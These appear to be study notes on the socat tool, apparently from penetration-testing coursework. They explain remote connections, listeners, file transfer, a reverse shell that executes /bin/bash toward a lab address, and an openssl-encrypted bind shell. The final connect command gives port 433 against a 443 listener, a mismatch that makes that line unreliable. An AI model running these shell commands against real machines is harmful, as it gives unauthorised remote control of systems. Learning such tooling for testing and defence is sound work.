
> for transferring data using two bidirectional byte streams (similar to netcat)
> 
> Platforms: Windows or Linux
### Connect to remote server
- `socat - TCP4:10.11.0.22:110`
	- `-`: transfer data between standard io and the remote host
	- colon-delimited values:
		- `TCP4`: protocol
		- `10.11.0.22`: destination ip address
		- `110`: destination port
	- E.g. ![[Pasted image 20231224123104.png]]
### Start a listener
- note: root privileges required to bind a listener on privileged port (TCP/IP port numbers below 1024)
- `sudo socat TCP4-LISTEN:443 STDOUT`
	- `TCP4-LISTEN`: protocol, listener
	- `443`: port
	- `STDOUT`: redirect standard output

## File Transfer
- share file: `sudo socat TCP4-LISTEN:443,fork file:sentfile.txt`
	- `fork`: create child process once connection is made to the listener
- receive file: `socat TCP4:10.11.0.4:443 file: receivedfile.txt,create`

## Reverse Shell
- on remote machine: `socat -d -d TCP4-LISTEN:443 STDOUT`
	- `-d -d`: increase verbosity
- on target machine: `socat TCP4:10.11.0.22:443 EXEC:/bin/bash`
	- `EXEC`: similar to `-e` in netcat

### Encrypted Bind Shell
1. Generate key and certificate
	- `openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt`
		- `-newkey`: generate a new private key
			- `rsa:2048`: specify RSA with 2048-bit key length
		- `-nodes`: store private key unencrypted
		- `-keyout [keyfilename]`: save key to file
		- `-days [days]`: specify validity period in days
		- `-out [certfilename]`: save certificate to file
		- ![[Pasted image 20231224150143.png]]
2. Convert key and certificate to a format accepted by socat
	- `cat bind_shell.key bind_shell.crt > bind_shell.pem`
3. Create socat listener on target machine
	- `sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash`
		- `OPENSSL-LISTEN:[port]`: create listener on port
		- `cert=[certfile]`: specify certificate file
		- `verify=0`: disable SSL certificate verification
		- `fork`: spawn child process once SSL is connected to a listener
4. Connect remote machine to target machine
	- `socat - OPENSSL:10.11.0.4:433,verify=0`
		- `-`: transfer data between standard IO and target machine
		- `OPENSSL`: establish remote SSL connection to the listener
		- `verify=0`: disable SSL certificate verification